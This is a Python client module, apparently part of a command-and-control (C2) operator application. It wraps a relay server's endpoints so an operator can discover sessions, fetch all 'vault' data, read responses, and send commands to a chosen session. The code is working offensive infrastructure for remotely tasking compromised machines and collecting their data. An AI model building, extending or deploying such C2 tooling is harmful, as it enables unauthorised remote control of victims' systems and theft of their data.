# api_client.py (Unchanged, but provided for completeness)
import requests
from config import RELAY_URL

class ApiClient:
    def __init__(self, main_window):
        self.main_window = main_window
        self.session = requests.Session()

    def _request(self, method, endpoint, **kwargs):
        try:
            url = f"{RELAY_URL}{endpoint}"
            response = self.session.request(method, url, timeout=15, **kwargs)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            error_message = f"API Error: {e}"
            if e.response is not None:
                try:
                    error_details = e.response.json().get("error", "No details provided.")
                    error_message += f" - {error_details}"
                except:
                    pass
            self.main_window.statusBar().showMessage(error_message, 5000)
            return None

    def register(self, username, password):
        return self._request('POST', '/auth/register', json={'username': username, 'password': password})

    def login(self, username, password):
        return self._request('POST', '/auth/login', json={'username': username, 'password': password})

    def discover_sessions(self, username):
        return self._request('POST', '/c2/discover', json={'username': username})

    def get_all_vault_data(self, username):
        return self._request('POST', '/c2/get_all_vault_data', json={'username': username})

    def get_responses(self, username, session_id):
        return self._request('POST', '/c2/get_responses', json={'username': username, 'session_id': session_id})

    def send_task(self, username, session_id, command):
        return self._request('POST', '/c2/task', json={'username': username, 'session_id': session_id, 'command': command})